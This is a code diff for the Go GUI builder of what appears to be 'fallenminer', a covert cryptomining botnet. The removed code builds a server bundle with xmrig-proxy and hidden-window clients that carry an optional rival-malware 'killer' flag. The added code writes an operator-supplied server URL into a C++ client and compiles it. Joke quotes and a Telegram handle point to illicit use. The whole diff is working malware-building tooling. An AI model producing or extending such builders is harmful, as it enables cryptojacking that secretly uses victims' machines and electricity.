@@ -1,16 +1,42 @@
 package main
 
 import (
+	"bytes"
 	"fmt"
+	"math/rand"
 	"os"
 	"os/exec"
 	"path/filepath"
-	"regexp"
-	"strings"
+	"runtime"
 
 	"fyne.io/fyne/v2"
 	"fyne.io/fyne/v2/dialog"
 )
+
+const (
+	srcFile        = "src/main.cpp"
+	backupFileName = "src/main.cpp.bak"
+)
+
+var (
+	cmakePath string
+	makePath  string
+	mingwPath string
+)
+
+func init() {
+
+	exeDir, _ := os.Executable()
+	baseDir := filepath.Dir(exeDir)
+
+	cmakePath = filepath.Join(baseDir, "portable_tools", "cmake", "bin", "cmake.exe")
+	makePath = filepath.Join(baseDir, "portable_tools", "make", "bin", "make.exe")
+	mingwPath = filepath.Join(baseDir, "portable_tools", "mingw64", "bin")
+
+	currentPath := os.Getenv("PATH")
+	newPath := fmt.Sprintf("%s;%s", mingwPath, currentPath)
+	os.Setenv("PATH", newPath)
+}
 
 func copyFile(src, dest string) error {
 
@@ -64,169 +90,91 @@ func CopyFolder(src, dst string) error {
 	return nil
 }
 
-func isGoVersionSupported() bool {
-
-	version, err := getGoVersion()
-	if err != nil {
-		fmt.Println("Error checking Go version:", err)
-		return false
-	}
-
-	re := regexp.MustCompile(`go(\d+\.\d+)`)
-	matches := re.FindStringSubmatch(version)
-	if len(matches) < 2 {
-		return false
-	}
-	versionNumber := matches[1]
-
-	return versionNumber >= "1.18"
+func randomquote() string {
+	quote := []string{"This better be legal.", "I can't stick to a schedule", "This should work...", "At least I don't steal bots *cough*", "t.me/fallenminer", "You like jazz?"}
+	return quote[rand.Intn(len(quote))]
 }
 
-func getGoVersion() (string, error) {
-	cmd := exec.Command("go", "version")
-	output, err := cmd.Output()
-	if err != nil {
-		return "", fmt.Errorf("failed to run 'go version': %v", err)
-	}
-	return string(output), nil
-}
-
-func isGCCInstalled() bool {
-	cmd := exec.Command("gcc", "--version")
-	err := cmd.Run()
-	if err != nil {
-		if strings.Contains(err.Error(), "executable file not found") {
-			return false
-		}
-		fmt.Println("Error checking GCC installation:", err)
-		return false
-	}
-	return true
-}
-
-func buildall(serveraddress string, serverbuild bool, malwarekill bool, window fyne.Window) error {
-	err := os.MkdirAll("bin", 0755)
-	if err != nil {
-		return fmt.Errorf("failed to create bin directory: %v", err)
-	}
-	if serverbuild {
-		buildserver(window)
-	}
-	buildclient(serveraddress, serverbuild, malwarekill, window)
-
-	return nil
-
-}
-
-func buildserver(window fyne.Window) {
-
-	originalDir, err := os.Getwd()
-	if err != nil {
-		dialog.ShowInformation("Error building server", err.Error(), window)
-	}
-	defer os.Chdir(originalDir)
-
-	serverDir := filepath.Join(originalDir, "Server")
-	err = os.Chdir(serverDir)
-	if err != nil {
-		dialog.ShowInformation("Error building server", err.Error(), window)
-	}
-
-	binDir := filepath.Join(originalDir, "bin", "server")
-	err = os.MkdirAll(binDir, 0755)
-	if err != nil {
-		dialog.ShowInformation("Error building server", err.Error(), window)
-	}
-
-	outputBinary := filepath.Join(binDir, "fallenminer-server.exe")
-	buildCmd := exec.Command("go", "build", "-o", outputBinary)
-	_, err = buildCmd.CombinedOutput()
-	if err != nil {
-		dialog.ShowInformation("Error building server", err.Error(), window)
-	}
-	CopyFolder(serverDir+"\\assets", binDir+"\\assets")
-	CopyFolder(serverDir+"\\views", binDir+"\\views")
-	copyFile(serverDir+"\\server.db", binDir+"\\server.db")
-	copyFile(serverDir+"\\xmrig-proxy.exe", binDir+"\\xmrig-proxy.exe")
-	copyFile(serverDir+"\\runserver.bat", binDir+"\\runserver.bat")
-
-	dialog.ShowInformation("Server", "Server built. Check /bin/server/ folder.", window)
-
-}
-
-func buildclient(serveraddress string, usepanel bool, malwarekill bool, window fyne.Window) {
+func buildclient(serveraddress string, window fyne.Window) {
 	originalDir, err := os.Getwd()
 	if err != nil {
 		dialog.ShowInformation("Error building client", err.Error(), window)
 	}
 	defer os.Chdir(originalDir)
 
-	clientDir := filepath.Join(originalDir, "Client")
-	err = os.Chdir(clientDir)
-	if err != nil {
+	dialog.ShowInformation("Starting Build.", randomquote(), window)
+
+	if err := backupFile(srcFile, backupFileName); err != nil {
 		dialog.ShowInformation("Error building client", err.Error(), window)
 	}
 
-	binDir := filepath.Join(originalDir, "bin", "client")
-	err = os.MkdirAll(binDir, 0755)
-	if err != nil {
+	if err := modifyURL(srcFile, serveraddress); err != nil {
 		dialog.ShowInformation("Error building client", err.Error(), window)
 	}
 
-	outputBinary := filepath.Join(binDir, "fallenminer.exe")
-
-	if usepanel {
-		if malwarekill {
-			buildCmd := exec.Command(
-				"go", "build",
-				"-o", outputBinary,
-				"-ldflags", fmt.Sprintf("-H=windowsgui -X main.endpoints=%s -X main.enablekiller=%s", serveraddress, "1"),
-				"-tags", "panel",
-			)
-			_, err = buildCmd.CombinedOutput()
-			if err != nil {
-				dialog.ShowInformation("Error building client", err.Error(), window)
-			}
-			dialog.ShowInformation("Client built.", "Check /bin/client", window)
-		} else {
-			buildCmd := exec.Command(
-				"go", "build",
-				"-o", outputBinary,
-				"-ldflags", fmt.Sprintf("-H=windowsgui -X main.endpoints=%s -X main.enablekiller=%s", serveraddress, "0"),
-				"-tags", "panel",
-			)
-			_, err = buildCmd.CombinedOutput()
-			if err != nil {
-				dialog.ShowInformation("Error building client", err.Error(), window)
-			}
-			dialog.ShowInformation("Client built.", "Check /bin/client", window)
-		}
-
-	} else {
-		if malwarekill {
-			buildCmd := exec.Command(
-				"go", "build",
-				"-o", outputBinary,
-				"-ldflags", fmt.Sprintf("-H=windowsgui -X main.endpoints=%s -X main.enablekiller=%s", serveraddress, "1"),
-			)
-			_, err = buildCmd.CombinedOutput()
-			if err != nil {
-				dialog.ShowInformation("Error building client", err.Error(), window)
-			}
-			dialog.ShowInformation("Client built.", "Check /bin/client", window)
-		} else {
-			buildCmd := exec.Command(
-				"go", "build",
-				"-o", outputBinary,
-				"-ldflags", fmt.Sprintf("-H=windowsgui -X main.endpoints=%s -X main.enablekiller=%s", serveraddress, "0"),
-			)
-			_, err = buildCmd.CombinedOutput()
-			if err != nil {
-				dialog.ShowInformation("Error building client", err.Error(), window)
-			}
-			dialog.ShowInformation("Client built.", "Check /bin/client", window)
-		}
-
+	if err := buildProject(); err != nil {
+		dialog.ShowInformation("Error building client", err.Error(), window)
 	}
 
+	if err := restoreFile(backupFileName, srcFile); err != nil {
+		dialog.ShowInformation("Error building client", err.Error(), window)
+	}
+
+	dialog.ShowInformation("Built", "check the /bin folder created :)", window)
+}
+
+func backupFile(src, dst string) error {
+	fmt.Printf("Backing up %s to %s\n", src, dst)
+	return copyFile(src, dst)
+}
+
+func modifyURL(filename, newURL string) error {
+	fmt.Printf("Modifying URL in %s to %s\n", filename, newURL)
+
+	content, err := os.ReadFile(filename)
+	if err != nil {
+		return err
+	}
+
+	// Replace any existing URL pattern
+	newContent := bytes.Replace(content,
+		[]byte(`std::wstring url = L"http";`),
+		[]byte(fmt.Sprintf(`std::wstring url = L"%s";`, newURL)),
+		1)
+
+	return os.WriteFile(filename, newContent, 0644)
+}
+
+func buildProject() error {
+	fmt.Println("Configuring project with CMake...")
+
+	// Create build directory
+	if err := os.MkdirAll("build", 0755); err != nil {
+		return err
+	}
+
+	// Use absolute path to CMake
+	cmake := exec.Command(cmakePath, "-G", "MinGW Makefiles", "..")
+	cmake.Dir = "build"
+	cmake.Stdout = os.Stdout
+	cmake.Stderr = os.Stderr
+	if err := cmake.Run(); err != nil {
+		return fmt.Errorf("CMake failed: %v", err)
+	}
+
+	numCores := runtime.NumCPU()
+	fmt.Printf("Using %d CPU cores\n", numCores)
+	make := exec.Command(makePath, fmt.Sprintf("-j%d", numCores))
+
+	make.Stdout = os.Stdout
+	make.Stderr = os.Stderr
+	make.Dir = "build"
+	make.Stdout = os.Stdout
+	make.Stderr = os.Stderr
+	return make.Run()
+}
+
+func restoreFile(src, dst string) error {
+	fmt.Printf("Restoring %s from %s\n", dst, src)
+	return copyFile(src, dst)
 }
